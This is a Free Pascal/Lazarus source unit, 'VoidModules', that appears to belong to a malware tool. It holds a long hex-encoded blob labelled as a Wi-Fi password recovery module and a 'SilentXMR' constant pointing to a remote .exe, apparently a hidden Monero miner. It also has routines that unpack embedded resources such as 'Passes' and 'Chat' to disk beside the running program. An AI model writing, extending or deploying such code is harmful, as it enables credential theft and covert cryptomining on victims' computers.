unit VoidModules;

{$mode objfpc}{$H+}

interface

uses
  Classes, Windows, SysUtils, LResources;

function GetModule(Num: LongInt): String;
function CutLResource(ResName: String): Boolean;
function CutStringLResource(ResName: String): String;
function CutStringResource(ResName: String): String;

const
  RecoverWifiPasswords = '41EF57638EF53A110DC66E45238F4951654A38640F18865197F4B2C20ED5F2D1DBE1D5B60E5661417EA8CE6C834269EE0838AC315D5C48435012A045A493572879A28A9D03B6AB83934190E31816823FD1A46F545C4DEFDC5B61988F671085110E197166137B4D4477727E7F4B5D76437E0ECF5EFA7BA1094EA3CBC29684417179ADA53F23994AA5933B48383256D3D2081CA99142C39721285424F23F440FAEE66D56497D4E4B5478524D484C4E0133F87D855B07D3C8B7BA2387502CB075427E6A06FD1930A8E40009F822FFFAE76341537E48554DA37B487A46E8E911A0D1F68A18FB5F9621819402AA9533A0EFD264445C574048A77D7C42444A5B5D76433B87B6BE9731135CA73B680FAF7E65FDF21C104D2534D742A3A2613F53C70F18F6434369AC4544A54AA4505AA4505AA45925E5A752444A5B5D76437E48554DF0D8089B2DC2C04675F8F94E5752444A5B5D764AA00B52784051A56F5D5A00B97252E22EEBE4FD1750247E53F1D221EF6556D12E1426BFCA98B7329E34F92871915B6073E2EF27FE04A24A49E62500BDA1611E9750481D9AE7791A94771FAE197166137B4D641C168522B7A5B88F10469146DCE4FB2761FC2BE6FC079DCB2C7A1E64F02E83DCDF9B4BE4265492837350B1537E4806CEA0C940C95E2836887C7F19A746462EF7308B0863A94505A50E92FD6AFC5F7F545C3108CE9649AB25439006A6B989FF8DB009E77505846766AD882013B482597B2D123CA9D17BE3CC0906BA48A9D0E5AA525F455FA04EA603043AFAD39FC21048262BA23AF48EA953060C674B6CCFEF6F1986512EABBF96EA31D4343F1652129D04EAE141B06FC03656BA2ECF62FD74A0D92C521299585E7E829A1935E2F3EC8D428FDC4B321AFD4F43F2E84B4E794C574048A72EFE9706006E637536B3B44BCF50401351507F5D5A49A147136529EA2842F3AC836C165DFBCF42DA3231974F3473AE65B051A56F54C15E1C5D7F4257EB3D5C48435051A56F5D1F0ACE44D9939BFE75D769405AA4505AA450090660B95757FE71AFC805399B5C33DAEDA27B7F705EDE635DD4525946583D6EA1CBB77F59847B1C7877DC50E59F10E40AF56E8B61697F2D73581E7A8EB1A20AE9571889223D62D67C9FF6D36E71AD6D454DF0D808D7FBF7A848220C994E774C4544F6EF5A9B03A202D3D36C16714F3218B27B7F5DE050A6557B3CF3C1DB6BE5BD4C7E9AF3B3DFE55A40730BD25B101BDC9377E92C581CDEFA973FE263E470A187A43CA35258EB4A1AAA4FA04EA6437E08EF95143D25D31D66C71BAE34819F57EB372FA47B78CDF3CFC938A7BD36E6E1C47AD654DB70C0DB69B5F84F8E247F647BF16A2848F94744C256A6628819F7075AEE78AC7C797A4FA04EA610BD1516FBBA7905D05E7230F4A74946587A46A16C2AFC9BB33036369D9C5A61C030D2BC024DD23FD1A46F545C574048A72EFE9706006E637536B3B44BCB07E71491B12DE7CBCE047EC53FBB5218524D48452DF30C5D7F4257EB3D5C48435051A56F5D1F0ACE44D9939BFE75D769405AA4505AA450090660B957540952F48C8D53B6E945E73645B35185481E774C4544ACB5B59DEE0DA07C5D3870EC47134A371BD81203';
  SilentXMR = 'http://s3.amazonaws.com/silentmonero/mssm-cmm.exe';

implementation

function StreamToString(Stre: TStream): AnsiString;
var M: TMemoryStream;
begin
  M:=TMemoryStream.Create;
  Stre.Position:=0;
  M.LoadFromStream(Stre);
  Stre.Position:=0;
  M.Position:=0;
  SetString(Result, PAnsiChar(M.Memory), M.Size);
  M.Free;
end;

function CutLResource(ResName: String): Boolean;
var
  r: TLResource;
  Data: String;
  LLie: Text;
begin
  r:=LazarusResources.Find(ResName);
  if Not(r=nil) then Begin
  Data:=r.Value;
  AssignFile(LLie,ExtractFilePath(ParamStr(0))+r.Name+'.'+lowercase(r.ValueType));
  Rewrite(LLie);
  Write(LLie,Data);
  CloseFile(LLie);
  if FileExists(ExtractFilePath(ParamStr(0))+r.Name+'.'+lowercase(r.ValueType)) then CutLResource:=True else CutLResource:=False;
  End else CutLResource:=False;
end;

function CutStringLResource(ResName: String): String;
var
  r: TLResource;
begin
  r:=LazarusResources.Find(ResName);
  if Not(r=nil) then CutStringLResource:=r.Value
  else CutStringLResource:='ERROR';
end;

function CutStringResource(ResName: String): String;
var
  ResStream: TResourceStream;
begin
  Result:='';
  try
    ResStream := TResourceStream.Create(HInstance, ResName, RT_RCDATA);
    ResStream.Position := 0;
    Result:=StreamToString(ResStream);
  except
    Result:='';
  end;
  ResStream.Free;
end;

function GetModule(Num: LongInt): String;
Begin
  Case Num of
   1: Result:=RecoverWifiPasswords;
   2: Result:=SilentXMR;
  end;
end;

initialization
{$I Scripts\Passes.lrs}
{$I Scripts\Chat.lrs}

end.
